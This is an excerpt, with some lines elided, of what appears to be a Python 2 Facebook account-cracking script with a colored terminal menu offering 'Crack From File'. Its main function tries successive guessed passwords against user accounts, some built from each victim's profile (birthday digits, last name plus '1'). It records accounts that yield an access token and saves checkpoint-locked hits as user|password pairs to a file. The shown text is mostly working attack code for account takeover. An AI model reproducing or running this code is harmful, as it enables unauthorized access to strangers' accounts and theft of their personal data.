...
\033[1;97m║\033[1;93m* \033[1;97mSupport    \033[1;91m: \033[1;94mDwMsrh \033[1;93m|\033[1;94m YagamiKo \033[1;97m           ║
...
def masuk():
	...
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Crack From File ( No Login )"
...
def login():
	...
	try:
		...
		pwd = raw_input('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		tik()
		try:
...
def gas(gea):
	...
	try:
		...
		if 'access_token' in q:
			...
			oke.append(user+pass1)
		else:
			if 'www.facebook.com' in q["error_msg"]:
				cek = open("out/super_cp.txt", "a")
				cek.write(user+"|"+pass1+"\n")
				cek.close()
				cekp.append(user+pass1)
			else:
				#Pass2
				...
				if 'access_token' in q:
					...
					oke.append(user+pass2)
				else:
					if 'www.facebook.com' in q["error_msg"]:
						cek = open("out/super_cp.txt", "a")
						cek.write(user+"|"+pass2+"\n")
						cek.close()
						cekp.append(user+pass2)
					else:
						#Pass3
						...
						if 'access_token' in q:
							...
							oke.append(user+pass3)
						else:
							if 'www.facebook.com' in q["error_msg"]:
								cek = open("out/super_cp.txt", "a")
								cek.write(user+"|"+pass3+"\n")
								cek.close()
								cekp.append(user+pass3)
							else:
								#Pass4
								lahir = b['birthday']
								pass4 = lahir.replace('/', '')
								...
								if 'access_token' in q:
									...
									oke.append(user+pass4)
								else:
									if 'www.facebook.com' in q["error_msg"]:
										cek = open("out/super_cp.txt", "a")
										cek.write(user+"|"+pass4+"\n")
										cek.close()
										cekp.append(user+pass4)
									else:
										#Pass5
										...
										if 'access_token' in q:
											...
											oke.append(user+pass5)
										else:
											if 'www.facebook.com' in q["error_msg"]:
												cek = open("out/super_cp.txt", "a")
												cek.write(user+"|"+pass5+"\n")
												cek.close()
												cekp.append(user+pass5)
											else:
												#Pass6
												...
												if 'access_token' in q:
													...
													oke.append(user+pass6)
												else:
													if 'www.facebook.com' in q["error_msg"]:
														cek = open("out/super_cp.txt", "a")
														cek.write(user+"|"+pass6+"\n")
														cek.close()
														cekp.append(user+pass6)
													else:
														#Pass7
														pass7 = b['last_name'] + '1'
														...
														if 'access_token' in q:
															...
															oke.append(user+pass7)
														else:
															if 'www.facebook.com' in q["error_msg"]:
																cek = open("out/super_cp.txt", "a")
																cek.write(user+"|"+pass7+"\n")
																cek.close()
																cekp.append(user+pass7)
